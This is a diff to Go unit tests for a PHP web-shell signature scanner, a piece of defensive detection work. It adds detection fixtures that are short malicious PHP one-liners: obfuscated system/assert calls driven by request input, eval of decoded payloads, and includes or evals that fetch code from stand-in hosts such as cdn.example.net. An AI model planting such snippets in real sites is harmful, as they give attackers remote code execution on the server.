@@ -67,7 +67,7 @@ func compromisedShop() fstest.MapFS {
 
 func run(t *testing.T, fsys fstest.MapFS) Result {
 	t.Helper()
-	out, err := Collector{}.Collect(context.Background(), collector.Source{FS: fsys})
+	out, err := (&Collector{}).Collect(context.Background(), collector.Source{FS: fsys})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -185,6 +185,10 @@ func TestSignaturesIgnoreOrdinaryCode(t *testing.T) {
 		"<?php\n/**\n * Reads `$_POST['menu']` and calls eval(base64_decode()) never.\n */\nfunction save() {}",
 		"<?php // system($_GET['x']) is what an attacker would write\n# eval(gzinflate(x))\n$a = 1;",
 		`<?php $msg = 'use // and # freely'; $url = "http://x/#a";`,
+		`<?php $method = 'get' . ucfirst($field); $this->$method();`,
+		`<?php $sep = "\x1f\x1e"; $bom = "\xEF\xBB\xBF"; $label = 'System' . ' settings';`,
+		`<?php include __DIR__ . '/config.php'; require_once $root . '/vendor/autoload.php';`,
+		`<?php $cmd = 'sys' . $suffix; $key = "exec_" . $id;`,
 	}
 	for _, c := range clean {
 		if sigs := matchSignatures([]byte(c), true); len(sigs) != 0 {
@@ -193,12 +197,23 @@ func TestSignaturesIgnoreOrdinaryCode(t *testing.T) {
 	}
 
 	malicious := map[string]string{
-		`<?php @eval(@base64_decode('ZWNobyAx'));`:      "eval_decoded_payload",
-		`<?php PassThru($_REQUEST['x']);`:               "exec_request_input",
-		`<?php assert($_COOKIE['a']);`:                  "eval_request_input",
-		`<?php $_GET['f']($_GET['a']);`:                 "request_input_as_function",
-		"<?php echo `$_POST[c]`;":                       "backtick_request_input",
-		`<?php preg_replace('/.*/e', $_POST['x'], '');`: "preg_replace_eval",
+		`<?php @eval(@base64_decode('ZWNobyAx'));`:                                                "eval_decoded_payload",
+		`<?php PassThru($_REQUEST['x']);`:                                                         "exec_request_input",
+		`<?php assert($_COOKIE['a']);`:                                                            "eval_request_input",
+		`<?php $_GET['f']($_GET['a']);`:                                                           "request_input_as_function",
+		"<?php echo `$_POST[c]`;":                                                                 "backtick_request_input",
+		`<?php preg_replace('/.*/e', $_POST['x'], '');`:                                           "preg_replace_eval",
+		`<?php $f = "sy"."stem"; $f($_GET["c"]);`:                                                 "obfuscated_function_name",
+		`<?php $f = "\x73\x79\x73\x74\x65\x6d"; $f($_GET["c"]);`:                                  "obfuscated_function_name",
+		`<?php $f = "\163\171\163\164\145\155"; @$f($c);`:                                         "obfuscated_function_name",
+		`<?php $a = chr(97).chr(115).chr(115).chr(101).chr(114).chr(116); $a($_POST[1]);`:         "obfuscated_function_name",
+		`<?php $k = "\x14\x0a\x06\x1a\x00\x18" ^ "gsuneu"; $k($_REQUEST["x"]);`:                   "obfuscated_function_name",
+		`<?php $f = 'base' . '64_' . 'decode'; eval($f($p));`:                                     "obfuscated_function_name",
+		`<?php if (isset($_COOKIE['t'])) { include('http://cdn.example.net/' . $_COOKIE['t']); }`: "remote_include",
+		`<?php include($_GET['page']);`:                                                           "include_request_input",
+		`<?php require 'php://input';`:                                                            "remote_include",
+		`<?php eval(file_get_contents('https://x.example/p'));`:                                   "eval_remote_content",
+		`<?php $GLOBALS['_fn']($_POST['a']);`:                                                     "globals_call",
 	}
 	for code, want := range malicious {
 		if sigs := matchSignatures([]byte(code), true); !slices.Contains(sigs, want) {
@@ -230,7 +245,7 @@ func TestNoApplications(t *testing.T) {
 func TestCancel(t *testing.T) {
 	ctx, cancel := context.WithCancel(context.Background())
 	cancel()
-	out, err := (Collector{}).Collect(ctx, collector.Source{FS: compromisedShop()})
+	out, err := (&Collector{}).Collect(ctx, collector.Source{FS: compromisedShop()})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -325,7 +340,7 @@ func TestLargeScriptsInUploads(t *testing.T) {
 	if err := os.Truncate(huge, collector.MaxHashSize+1<<20); err != nil {
 		t.Fatal(err)
 	}
-	out, err := Collector{}.Collect(context.Background(), collector.NewSource(dir))
+	out, err := (&Collector{}).Collect(context.Background(), collector.NewSource(dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -403,7 +418,7 @@ func TestSymlinks(t *testing.T) {
 	link("photo.jpg", "var/www/site/uploads/latest.jpg")
 	link("index.php", "var/www/site/home.php")
 
-	out, err := Collector{}.Collect(context.Background(), collector.NewSource(dir))
+	out, err := (&Collector{}).Collect(context.Background(), collector.NewSource(dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -452,7 +467,7 @@ func (tr *tree) link(target, p string) {
 
 func (tr *tree) scan() Result {
 	tr.t.Helper()
-	out, err := Collector{}.Collect(context.Background(), collector.NewSource(tr.root))
+	out, err := (&Collector{}).Collect(context.Background(), collector.NewSource(tr.root))
 	if err != nil {
 		tr.t.Fatal(err)
 	}
@@ -762,7 +777,7 @@ func TestCodeInDataFiles(t *testing.T) {
 	want := map[string]string{
 		"var/report/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08": "exec_request_input",
 		"var/session/sess_9a02": "backtick_request_input",
-		"var/log/debug.log":     "dangerous_call",
+		"var/log/debug.log":     "include_request_input",
 		"var/log/system.log":    "eval_decoded_payload,eval_request_input",
 	}
 	if fmt.Sprint(got) != fmt.Sprint(want) {
@@ -775,5 +790,40 @@ func BenchmarkCodeInData(b *testing.B) {
 	b.SetBytes(int64(len(log)))
 	for b.Loop() {
 		codeInData(log)
+	}
+}
+
+// Signatures run over a corpus of clean applications (PHP_CORPUS, a directory) report nothing.
+func TestSignaturesOnCleanCorpus(t *testing.T) {
+	dir := os.Getenv("PHP_CORPUS")
+	if dir == "" {
+		t.Skip("PHP_CORPUS not set")
+	}
+	files := 0
+	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error { //nolint:gosec // a test corpus chosen by whoever runs it
+		if err != nil || d.IsDir() || !isScript(strings.ToLower(d.Name())) {
+			return err
+		}
+		data, err := os.ReadFile(p) //nolint:gosec // a test corpus chosen by whoever runs it
+		if err != nil {
+			return err
+		}
+		files++
+		if sigs := matchSignatures(data, true); len(sigs) > 0 && !slices.Equal(sigs, []string{"encoded_blob"}) {
+			t.Errorf("%s: %v", p, sigs)
+		}
+		return nil
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Logf("%d scripts", files)
+}
+
+func BenchmarkSignatures(b *testing.B) {
+	src := []byte(strings.Repeat(`<?php $label = "Order #" . $id . ' of ' . "\x1f" . $name; $this->$method($a, 'b' . 'c');`+"\n", 20000))
+	b.SetBytes(int64(len(src)))
+	for b.Loop() {
+		matchSignatures(src, true)
 	}
 }
